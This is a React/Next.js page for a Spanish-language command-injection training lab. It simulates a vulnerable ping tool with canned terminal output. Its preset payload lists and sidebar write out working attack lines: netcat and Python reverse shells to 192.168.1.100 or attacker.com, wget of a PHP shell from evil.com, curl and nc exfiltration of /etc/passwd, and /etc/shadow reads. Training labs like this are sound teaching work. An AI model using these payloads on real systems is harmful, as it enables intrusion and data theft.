'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { useSecurityAnalytics } from '@/app/hooks/useSecurityAnalytics';

export default function CommandInjectionPage() {
  const [command, setCommand] = useState('');
  const [result, setResult] = useState('');
  const [loading, setLoading] = useState(false);
  const [injectionType, setInjectionType] = useState('basic');
  const [operatingSystem, setOperatingSystem] = useState('linux');
  const [executedCommands, setExecutedCommands] = useState<string[]>([]);
  const [privileges, setPrivileges] = useState('user');

  const { trackEvent, trackVulnerabilityPageVisit } = useSecurityAnalytics();

  useEffect(() => {
    trackVulnerabilityPageVisit('Command Injection', 'advanced_command_injection');
  }, [trackVulnerabilityPageVisit]);

  const executeCommand = async () => {
    setLoading(true);
    try {
      // Simulate command execution
      await new Promise(resolve => setTimeout(resolve, 1500));

      let success = false;
      let output = '';
      let privilege_escalation = false;

      // Simulate different injection results based on payload
      const lowerCommand = command.toLowerCase();

      if (lowerCommand.includes('whoami')) {
        success = true;
        output = privileges === 'root' ? 'root\n' : 'www-data\n';
      } else if (lowerCommand.includes('id')) {
        success = true;
        output = privileges === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)\n' : 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
      } else if (lowerCommand.includes('ls')) {
        success = true;
        output = 'config.php\nindex.php\nuploads/\nbackup/\n.htaccess\npasswords.txt\nflag.txt\n';
      } else if (lowerCommand.includes('cat') && lowerCommand.includes('passwd')) {
        success = true;
        output = 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash\n';
      } else if (lowerCommand.includes('ps aux') || lowerCommand.includes('ps -ef')) {
        success = true;
        output = 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1   2276   692 ?        Ss   10:00   0:01 /sbin/init\nroot       123  0.0  0.2   4356  1024 ?        S    10:01   0:00 /usr/sbin/sshd\nwww-data   456  0.0  0.3   8712  1536 ?        S    10:05   0:00 /usr/sbin/apache2\n';
      } else if (lowerCommand.includes('sudo') || lowerCommand.includes('su -')) {
        if (privileges === 'user' && Math.random() > 0.3) {
          success = true;
          privilege_escalation = true;
          setPrivileges('root');
          output = 'Privilege escalation successful! You are now root.\n# ';
        } else {
          output = 'Permission denied. sudo: command not found or insufficient privileges\n';
        }
      } else if (lowerCommand.includes('nc ') || lowerCommand.includes('netcat')) {
        success = true;
        output = 'Reverse shell established...\nConnection to 192.168.1.100 port 4444 [tcp/*] succeeded!\n$ ';
      } else if (lowerCommand.includes('wget') || lowerCommand.includes('curl')) {
        success = true;
        output = 'File downloaded successfully.\n--2024-01-01 10:00:00--  http://evil.com/shell.php\nResolving evil.com... 192.168.1.100\nConnecting to evil.com|192.168.1.100|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-php]\nSaving to: \'shell.php\'\n';
      } else if (lowerCommand.includes('find') && lowerCommand.includes('suid')) {
        success = true;
        output = '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n/usr/bin/ping\n/usr/lib/openssh/ssh-keysign\n/bin/mount\n/bin/umount\n';
      } else if (lowerCommand.includes('uname')) {
        success = true;
        output = operatingSystem === 'linux' ? 'Linux webserver 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n' :
                operatingSystem === 'windows' ? 'Microsoft Windows [Version 10.0.19041.508]\n' :
                'Darwin webserver.local 20.1.0 Darwin Kernel Version 20.1.0 x86_64\n';
      } else if (lowerCommand.includes('env') || lowerCommand.includes('printenv')) {
        success = true;
        output = 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/var/www\nSHELL=/bin/bash\nDB_PASSWORD=super_secret_password_123\nAPI_KEY=sk-1234567890abcdef\nJWT_SECRET=my_super_secret_jwt_key\n';
      } else if (lowerCommand.includes(';') || lowerCommand.includes('&&') || lowerCommand.includes('||') || lowerCommand.includes('|')) {
        success = true;
        output = 'Command injection successful! Multiple commands executed.\nping: option not recognized\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
      } else {
        output = 'ping: invalid option or command not found\nUsage: ping [-c count] hostname\n';
      }

      setResult(output);

      if (success) {
        setExecutedCommands(prev => [...prev, command]);
      }

      // Track the command injection attempt
      trackEvent({
        type: 'vulnerability_test',
        category: 'General',
        action: 'command_injection_attempt',
        label: success ? 'successful' : 'failed',
        value: command.length,
        metadata: {
          command_snippet: command.substring(0, 100),
          injection_type: injectionType,
          operating_system: operatingSystem,
          success,
          privilege_escalation,
          current_privileges: privileges,
          command_length: command.length,
          contains_pipe: command.includes('|'),
          contains_semicolon: command.includes(';'),
          contains_ampersand: command.includes('&&')
        }
      });

    } catch (error) {
      setResult('Error executing command');
    } finally {
      setLoading(false);
    }
  };

  const presetCommands = {
    basic: [
      '; whoami',
      '&& id',
      '|| ls -la',
      '| cat /etc/passwd'
    ],
    advanced: [
      '; nc -e /bin/bash 192.168.1.100 4444',
      '&& wget http://evil.com/shell.php',
      '|| curl -X POST --data-binary @/etc/passwd http://evil.com/steal',
      '| python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.1.100\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'
    ],
    privilege_escalation: [
      '; sudo su -',
      '&& find / -perm -4000 2>/dev/null',
      '|| sudo -l',
      '| su - root'
    ],
    data_exfiltration: [
      '; cat /etc/shadow > /tmp/shadow.txt',
      '&& tar -czf /tmp/backup.tar.gz /home/admin/*',
      '|| base64 /etc/passwd | nc 192.168.1.100 9999',
      '| grep -r "password" /var/www/html/'
    ]
  };

  const resetPrivileges = () => {
    setPrivileges('user');
    setExecutedCommands([]);
    setResult('');
    setCommand('');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-green-900">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <Link
            href="/"
            className="text-green-400 hover:text-green-300 flex items-center font-medium transition-colors duration-300"
          >
            ← Volver al inicio
          </Link>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold bg-gradient-to-r from-green-400 to-blue-400 bg-clip-text text-transparent mb-4">
            Command Injection - Laboratorio Avanzado
          </h1>
          <div className="flex justify-center items-center mb-4">
            <div className="h-px bg-gradient-to-r from-transparent via-green-500 to-transparent w-64"></div>
          </div>
          <p className="text-xl text-gray-300 max-w-2xl mx-auto">
            Ejecuta comandos del sistema mediante inyección en aplicaciones web vulnerables
          </p>
          <p className="text-lg text-green-400 font-semibold bg-green-900/20 border border-green-500/30 rounded-lg p-3 max-w-2xl mx-auto mt-4">
            💻 LABORATORIO DE COMMAND INJECTION AVANZADO
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Testing Area */}
          <div className="lg:col-span-2 space-y-8">
            {/* System Configuration */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-blue-500/30">
              <h2 className="text-3xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center mr-3">
                  ⚙️
                </span>
                Configuración del Sistema
              </h2>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div>
                  <label className="block text-sm font-medium text-blue-300 mb-2">
                    Sistema Operativo
                  </label>
                  <div className="space-y-2">
                    {['linux', 'windows', 'macos'].map((os) => (
                      <button
                        key={os}
                        onClick={() => setOperatingSystem(os)}
                        className={`w-full px-4 py-2 rounded-lg text-sm transition-all duration-300 ${
                          operatingSystem === os
                            ? 'bg-blue-600 text-white'
                            : 'bg-blue-900/20 hover:bg-blue-900/40 border border-blue-500/30 text-blue-300'
                        }`}
                      >
                        {os.charAt(0).toUpperCase() + os.slice(1)}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-blue-300 mb-2">
                    Privilegios Actuales
                  </label>
                  <div className={`px-4 py-3 rounded-lg border text-center font-semibold ${
                    privileges === 'root'
                      ? 'bg-red-900/20 border-red-500/30 text-red-300'
                      : 'bg-yellow-900/20 border-yellow-500/30 text-yellow-300'
                  }`}>
                    {privileges === 'root' ? '🔴 ROOT' : '🟡 USER'}
                  </div>
                  {privileges === 'root' && (
                    <button
                      onClick={resetPrivileges}
                      className="w-full mt-2 px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg text-sm transition-all duration-300"
                    >
                      Reset to User
                    </button>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-medium text-blue-300 mb-2">
                    Tipo de Inyección
                  </label>
                  <div className="space-y-2">
                    {['basic', 'advanced'].map((type) => (
                      <button
                        key={type}
                        onClick={() => setInjectionType(type)}
                        className={`w-full px-4 py-2 rounded-lg text-sm transition-all duration-300 ${
                          injectionType === type
                            ? 'bg-blue-600 text-white'
                            : 'bg-blue-900/20 hover:bg-blue-900/40 border border-blue-500/30 text-blue-300'
                        }`}
                      >
                        {type.charAt(0).toUpperCase() + type.slice(1)}
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Command Injection Testing */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-green-500/30">
              <h2 className="text-3xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                  💻
                </span>
                Ping Tool (Vulnerable)
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-green-300 mb-2">
                    Hostname or IP Address (Command Injection Point)
                  </label>
                  <div className="flex gap-3">
                    <input
                      type="text"
                      value={command}
                      onChange={(e) => setCommand(e.target.value)}
                      placeholder="127.0.0.1; whoami"
                      className="flex-1 px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent font-mono"
                    />
                    <button
                      onClick={executeCommand}
                      disabled={loading}
                      className="px-6 py-3 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 font-medium disabled:opacity-50"
                    >
                      {loading ? 'Ejecutando...' : 'Ping'}
                    </button>
                  </div>
                </div>

                {result && (
                  <div className="p-4 bg-gray-700/50 border border-green-500/30 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <h3 className="text-lg font-semibold text-green-300">Terminal Output</h3>
                      <span className="text-sm text-gray-400">{privileges}@webserver:~$</span>
                    </div>
                    <pre className="text-white font-mono text-sm whitespace-pre-wrap bg-black/50 p-3 rounded overflow-x-auto">
                      {result}
                    </pre>
                  </div>
                )}
              </div>
            </div>

            {/* Preset Commands */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-orange-500/30">
              <h3 className="text-2xl font-bold text-white mb-6 flex items-center">
                <span className="w-8 h-8 bg-orange-600 rounded-lg flex items-center justify-center mr-3">
                  🎯
                </span>
                Payloads de Command Injection
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {Object.entries(presetCommands).map(([category, commands]) => (
                  <div key={category} className="space-y-3">
                    <h4 className="text-lg font-semibold text-orange-300 capitalize">
                      {category.replace('_', ' ')}
                    </h4>
                    <div className="space-y-2">
                      {commands.map((presetCommand, index) => (
                        <button
                          key={index}
                          onClick={() => setCommand(`127.0.0.1${presetCommand}`)}
                          className="w-full text-left px-3 py-2 bg-orange-900/20 hover:bg-orange-900/30 border border-orange-500/30 rounded-lg text-xs text-white transition-all duration-300 font-mono break-all"
                        >
                          127.0.0.1{presetCommand}
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Sidebar */}
          <div className="space-y-6">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-purple-500/30">
              <h3 className="text-xl font-bold mb-4 text-purple-400 flex items-center">
                <span className="w-8 h-8 bg-purple-600 rounded-lg flex items-center justify-center mr-3">
                  📚
                </span>
                Técnicas de Inyección
              </h3>
              <div className="space-y-3 text-sm">
                <div className="p-3 bg-blue-900/20 border border-blue-500/30 rounded">
                  <h4 className="font-semibold text-blue-300 mb-2">Semicolon (;)</h4>
                  <code className="text-xs text-gray-300">127.0.0.1; whoami</code>
                </div>
                <div className="p-3 bg-green-900/20 border border-green-500/30 rounded">
                  <h4 className="font-semibold text-green-300 mb-2">AND (&&)</h4>
                  <code className="text-xs text-gray-300">127.0.0.1 && id</code>
                </div>
                <div className="p-3 bg-yellow-900/20 border border-yellow-500/30 rounded">
                  <h4 className="font-semibold text-yellow-300 mb-2">OR (||)</h4>
                  <code className="text-xs text-gray-300">127.0.0.1 || ls -la</code>
                </div>
                <div className="p-3 bg-red-900/20 border border-red-500/30 rounded">
                  <h4 className="font-semibold text-red-300 mb-2">Pipe (|)</h4>
                  <code className="text-xs text-gray-300">127.0.0.1 | cat /etc/passwd</code>
                </div>
              </div>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-green-500/30">
              <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                  🎯
                </span>
                Objetivos del Lab
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Ejecutar comandos del sistema</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Escalar privilegios a root</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Establecer reverse shell</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Exfiltrar datos sensibles</span>
                </div>
                <div className="flex items-start">
                  <span className="text-green-400 mr-2 mt-1">•</span>
                  <span>Enumerar el sistema</span>
                </div>
              </div>
            </div>

            {executedCommands.length > 0 && (
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-green-500/30">
                <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                  <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                    ✅
                  </span>
                  Comandos Ejecutados
                </h3>
                <div className="space-y-2 text-sm">
                  {executedCommands.slice(-5).map((cmd, index) => (
                    <div key={index} className="p-2 bg-green-900/20 border border-green-500/30 rounded">
                      <p className="text-green-300 font-mono text-xs break-all">{cmd}</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-6 border border-red-500/30">
              <h3 className="text-xl font-bold mb-4 text-red-400 flex items-center">
                <span className="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center mr-3">
                  ⚡
                </span>
                Payloads Avanzados
              </h3>
              <div className="space-y-3 text-sm text-gray-300">
                <div className="p-3 bg-red-900/20 border border-red-500/30 rounded">
                  <h4 className="font-semibold text-red-300 mb-1">Reverse Shell</h4>
                  <p className="text-xs">nc -e /bin/bash attacker.com 4444</p>
                </div>
                <div className="p-3 bg-orange-900/20 border border-orange-500/30 rounded">
                  <h4 className="font-semibold text-orange-300 mb-1">Python Shell</h4>
                  <p className="text-xs">python3 -c "import pty;pty.spawn('/bin/bash')"</p>
                </div>
                <div className="p-3 bg-yellow-900/20 border border-yellow-500/30 rounded">
                  <h4 className="font-semibold text-yellow-300 mb-1">Data Exfiltration</h4>
                  <p className="text-xs">base64 /etc/passwd | curl -d @- evil.com</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}